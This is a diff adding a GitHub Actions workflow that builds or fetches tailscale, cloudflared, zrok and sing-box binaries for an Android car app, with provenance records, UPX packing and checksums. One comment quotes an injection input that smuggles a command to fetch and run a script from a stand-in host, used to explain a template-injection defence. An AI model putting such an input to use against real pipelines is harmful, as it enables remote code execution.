@@ -1,0 +1,253 @@
+name: Tunnel binaries
+
+# Builds the four tunnel executables the app ships (tailscale, cloudflared, zrok,
+# sing-box) from upstream source, for arm64, and publishes them with checksums.
+#
+# WHY THIS EXISTS
+# ---------------
+# These four were previously committed to the repository as ~40 MB of opaque prebuilt
+# blobs under app/src/main/jniLibs/arm64-v8a/. An audit of them established:
+#
+#   * all four are UPX-packed, and three had the UPX PackHeader stripped, so `upx -d`
+#     refuses them and they cannot be unpacked for inspection;
+#   * the one that could be unpacked (tailscale) reports `mod tailscale.com (devel)` —
+#     a build from a working tree, matching no official release artifact;
+#   * cloudflared self-reports `DEV (built unknown)` and zrok `v1.1.x [developer build]`,
+#     i.e. neither carries any version information that can be checked against anything.
+#
+# Nothing malicious was found, but "we cannot verify this" is not a property a repo
+# should have for four binaries that open network tunnels on a car. Building them here,
+# from pinned upstream refs, replaces trust-the-blob with a reproducible recipe.
+#
+# The packing is kept — it is load-bearing for APK size (tailscale is 4.3 MB packed vs
+# 17.9 MB unpacked) — but the PackHeader is left INTACT, so anyone can `upx -d` the
+# result and read it. That is the property the vendored copies lacked.
+
+on:
+  workflow_dispatch:
+    inputs:
+      tailscale_ref:
+        description: "tailscale git tag, or 'latest'"
+        default: "v1.98.10"
+      cloudflared_ref:
+        description: "cloudflared git tag, or 'latest'"
+        default: "2026.7.3"
+      zrok_ref:
+        # NOT 'latest'. zrok v2 renamed the command to cmd/zrok2 and is a breaking major;
+        # the binary this app shipped self-reports v1.1.x, and ZrokLauncher is written
+        # against that CLI. Staying on v1 is a compatibility requirement, not conservatism.
+        description: "zrok git tag (stay on v1.x — v2 is a breaking change for ZrokLauncher)"
+        default: "v1.1.11"
+      singbox_ref:
+        # The version the shipped binary self-reported, corroborated against the upstream
+        # tag by the audit. Keeping it means the app gets the sing-box it was tested with.
+        description: "sing-box git tag"
+        default: "v1.12.14"
+  push:
+    paths:
+      - ".github/workflows/tunnel-binaries.yml"
+
+permissions:
+  contents: read
+
+concurrency:
+  group: tunnel-binaries-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  build:
+    name: Build tunnel binaries (arm64)
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          persist-credentials: false
+
+      - uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # v5
+        with:
+          go-version: "stable"
+          check-latest: true
+
+      - name: Install UPX
+        run: sudo apt-get update -qq && sudo apt-get install -y -qq upx-ucl
+
+      - name: Build binaries
+        env:
+          # CGO off + GOOS=linux gives a fully static arm64 executable. The app execs these
+          # as processes (it copies them out of nativeLibraryDir and runs them via shell) —
+          # it never dlopen()s them — so they do not need to be Android/bionic-linked. The
+          # vendored copies were GOOS=android and therefore depended on /system/bin/linker64,
+          # which is also why they could not be run anywhere but the device for analysis.
+          CGO_ENABLED: "0"
+          GOOS: linux
+          GOARCH: arm64
+          # Reproducibility: -trimpath removes local filesystem paths; -buildvcs=false keeps
+          # this repo's VCS state out of binaries built from someone else's module.
+          GOFLAGS: "-trimpath -buildvcs=false"
+          # `gh api` resolves "latest" to a concrete release tag. Read-only.
+          GH_TOKEN: ${{ github.token }}
+          # workflow_dispatch inputs reach the script as environment variables, never
+          # interpolated into the shell source. A `${{ ... }}` expansion inside a run block
+          # is textual substitution before bash ever sees it, so an input like
+          #   latest"; curl evil.sh | sh; #
+          # would execute. As env vars they are inert data. (zizmor: template-injection)
+          TS_REF_IN: ${{ inputs.tailscale_ref }}
+          CF_REF_IN: ${{ inputs.cloudflared_ref }}
+          ZR_REF_IN: ${{ inputs.zrok_ref }}
+          SB_REF_IN: ${{ inputs.singbox_ref }}
+        run: |
+          set -euo pipefail
+          mkdir -p out
+
+          # Defaults live here as well as in the inputs block: a `push`-triggered run has
+          # no inputs at all, so these would otherwise be empty.
+          TS_REF="${TS_REF_IN:-v1.98.10}"
+          CF_REF="${CF_REF_IN:-2026.7.3}"
+          ZR_REF="${ZR_REF_IN:-v1.1.11}"
+          SB_REF="${SB_REF_IN:-v1.12.14}"
+
+          # Reject anything that is not a plausible module version. These are pasted into
+          # `go install mod@REF`, and this is the last line of defence if the env-var
+          # discipline above is ever undone.
+          for r in "$TS_REF" "$CF_REF" "$ZR_REF" "$SB_REF"; do
+            case "$r" in
+              latest|v[0-9]*|[0-9]*.[0-9]*|[0-9a-f]*) ;;
+              *) echo "::error::refusing suspicious version ref: $r"; exit 1 ;;
+            esac
+          done
+
+          # tailscale: the tag set is not decoration. It is what keeps the binary at ~4 MB
+          # instead of ~30 MB, and it was recovered from the shipped binary's own build info
+          # so this reproduces the size profile the app was designed around. ts_include_cli
+          # folds the `tailscale` CLI into the daemon, which is why one file serves as both.
+          TS_TAGS="ts_include_cli,ts_omit_ace,ts_omit_acme,ts_omit_advertiseexitnode,ts_omit_advertiseroutes,ts_omit_appconnectors,ts_omit_aws,ts_omit_bakedroots,ts_omit_bird,ts_omit_c2n,ts_omit_cachenetmap,ts_omit_captiveportal,ts_omit_capture,ts_omit_cliconndiag,ts_omit_clientupdate,ts_omit_cloud,ts_omit_colorable,ts_omit_completion,ts_omit_completion_scripts,ts_omit_conn25,ts_omit_dbus,ts_omit_debug,ts_omit_debugeventbus,ts_omit_debugportmapper,ts_omit_desktop_sessions,ts_omit_dns,ts_omit_doctor,ts_omit_drive,ts_omit_gro,ts_omit_health,ts_omit_hujsonconf,ts_omit_identityfederation,ts_omit_iptables,ts_omit_kube,ts_omit_lazywg,ts_omit_linkspeed,ts_omit_linuxdnsfight,ts_omit_listenrawdisco,ts_omit_logtail,ts_omit_netlog,ts_omit_networkmanager,ts_omit_oauthkey,ts_omit_peerapiclient,ts_omit_peerapiserver,ts_omit_portlist,ts_omit_portmapper,ts_omit_posture,ts_omit_qrcodes,ts_omit_relayserver,ts_omit_resolved,ts_omit_sdnotify,ts_omit_ssh,ts_omit_synology,ts_omit_syspolicy,ts_omit_systray,ts_omit_taildrop,ts_omit_tailnetlock,ts_omit_tap,ts_omit_tpm,ts_omit_unixsocketidentity,ts_omit_useexitnode,ts_omit_useproxy,ts_omit_usermetrics,ts_omit_useroutes,ts_omit_wakeonlan,ts_omit_webbrowser,ts_omit_webclient"
+
+          # STRATEGY: prefer the official upstream release artifact; build from source
+          # only where no published artifact can serve.
+          #
+          #   cloudflared / zrok / sing-box -> download upstream's own arm64 release.
+          #     Those are the artifacts upstream builds, tests and publishes checksums for.
+          #     Rebuilding them ourselves would produce something *less* verifiable, not
+          #     more — and it is what the vendored blobs did (all three self-reported as
+          #     developer builds with no checkable version).
+          #
+          #   tailscale -> build from source, because no official artifact exists for the
+          #     configuration this app needs: the ~60 ts_omit_* tags below are what keep it
+          #     at ~4 MB instead of ~30 MB, and an official tailscaled is the full build.
+          #
+          # Failures that shaped this, all from this workflow's own CI:
+          #   * `go install pkg@version` refuses modules with `replace` directives in
+          #     go.mod (cloudflared has them).
+          #   * zrok cannot be `go build`-ed without first running its npm UI build —
+          #     `//go:embed dist` fails with "pattern dist: no matching files found".
+          mkdir -p src
+          : > out/PROVENANCE.txt
+
+          note() { echo "$*" >> out/PROVENANCE.txt; }
+
+          # --- tailscale: from source ---------------------------------------------------
+          echo "::group::tailscaled (tailscale/tailscale @ $TS_REF, from source)"
+          git clone --quiet --depth 1 --branch "$TS_REF" https://github.com/tailscale/tailscale.git src/tailscale
+          note "tailscaled  source  tailscale/tailscale  $TS_REF  $(git -C src/tailscale rev-parse HEAD)"
+          ( cd src/tailscale && go build -trimpath -ldflags="-s -w" -tags="$TS_TAGS" -o ../../out/tailscaled ./cmd/tailscaled )
+          echo "::endgroup::"
+
+          # --- the rest: official upstream release artifacts -----------------------------
+          echo "::group::cloudflared (cloudflare/cloudflared @ $CF_REF, official artifact)"
+          gh release download "$CF_REF" --repo cloudflare/cloudflared \
+            --pattern "cloudflared-linux-arm64" --output out/cloudflared --clobber
+          chmod +x out/cloudflared
+          note "cloudflared release  cloudflare/cloudflared  $CF_REF  cloudflared-linux-arm64  sha256=$(sha256sum out/cloudflared | cut -d" " -f1)"
+          echo "::endgroup::"
+
+          echo "::group::zrok (openziti/zrok @ $ZR_REF, official artifact)"
+          ZR_NUM="${ZR_REF#v}"
+          gh release download "$ZR_REF" --repo openziti/zrok \
+            --pattern "zrok_${ZR_NUM}_linux_arm64.tar.gz" --output src/zrok.tgz --clobber
+          note "zrok        release  openziti/zrok  $ZR_REF  zrok_${ZR_NUM}_linux_arm64.tar.gz  sha256=$(sha256sum src/zrok.tgz | cut -d" " -f1)"
+          tar -xzf src/zrok.tgz -C src zrok
+          mv src/zrok out/zrok
+          echo "::endgroup::"
+
+          echo "::group::sing-box (sagernet/sing-box @ $SB_REF, official ANDROID artifact)"
+          SB_NUM="${SB_REF#v}"
+          # sing-box publishes a real android-arm64 build — use it rather than the linux one.
+          gh release download "$SB_REF" --repo sagernet/sing-box \
+            --pattern "sing-box-${SB_NUM}-android-arm64.tar.gz" --output src/singbox.tgz --clobber
+          note "sing-box    release  sagernet/sing-box  $SB_REF  sing-box-${SB_NUM}-android-arm64.tar.gz  sha256=$(sha256sum src/singbox.tgz | cut -d" " -f1)"
+          tar -xzf src/singbox.tgz -C src --strip-components=1 "sing-box-${SB_NUM}-android-arm64/sing-box"
+          mv src/sing-box out/sing-box
+          chmod +x out/sing-box
+
+          echo "::endgroup::"
+
+          echo "### provenance"; cat out/PROVENANCE.txt
+          ls -la out/
+
+      - name: Record build info
+        # PROVENANCE.txt (written above) already records, per binary, whether it came from
+        # source or an upstream release, the exact tag, and the commit or artifact digest.
+        # This adds each binary's embedded Go build info on top — the module table that,
+        # for the vendored blobs, could only be recovered by unpacking one of them and
+        # dumping the other three out of live process memory on the car.
+        run: |
+          set -euo pipefail
+          : > out/VERSIONS.txt
+          for b in out/tailscaled out/cloudflared out/zrok out/sing-box; do
+            echo "### $b" >> out/VERSIONS.txt
+            go version -m "$b" 2>/dev/null | grep -E "^[[:space:]]+(path|mod|build[[:space:]]+-tags)" >> out/VERSIONS.txt || \
+              echo "  (no embedded build info)" >> out/VERSIONS.txt
+          done
+          echo "### provenance"; cat out/PROVENANCE.txt
+          echo "### versions";   cat out/VERSIONS.txt
+
+      - name: Pack and name for jniLibs
+        # Android extracts lib/<abi>/*.so from the APK to nativeLibraryDir with the execute
+        # bit set, which is why CLI executables are shipped under .so names. That part of
+        # the original design is sound and is preserved.
+        run: |
+          set -euo pipefail
+          mkdir -p dist
+          pack() {
+            local src="$1" dst="$2"
+            cp "out/$src" "dist/$dst"
+            # NO --no-mark: the PackHeader must survive so `upx -d` works. That is the
+            # whole point — the vendored blobs had it stripped and were unanalysable.
+            # Default compression rather than --best: on ~100 MB of binaries --best ran
+            # for >15 min in CI for roughly a percent of size, which is a bad trade for
+            # something that runs on every workflow change.
+            upx -q "dist/$dst" >/dev/null
+            upx -t "dist/$dst"     # refuses if the packed image is not decompressible
+          }
+          pack tailscaled  libtailscale.so
+          pack cloudflared libcloudflared.so
+          pack zrok        libzrok.so
+          pack sing-box    libsingbox.so
+          ls -la dist/
+
+      - name: Verify each artifact is arm64 and round-trips through upx -d
+        run: |
+          set -euo pipefail
+          for f in dist/*.so; do
+            file "$f"
+            file "$f" | grep -q "ARM aarch64" || { echo "::error::$f is not arm64"; exit 1; }
+            upx -d -o /tmp/unpacked "$f" >/dev/null
+            rm -f /tmp/unpacked
+            echo "  ✓ $f unpacks cleanly (PackHeader intact)"
+          done
+
+      - name: Checksums
+        run: |
+          cd dist && sha256sum *.so | tee SHA256SUMS
+
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
+        with:
+          name: tunnel-binaries-arm64
+          path: |
+            dist/*.so
+            dist/SHA256SUMS
+            out/VERSIONS.txt
+            out/PROVENANCE.txt
+          if-no-files-found: error
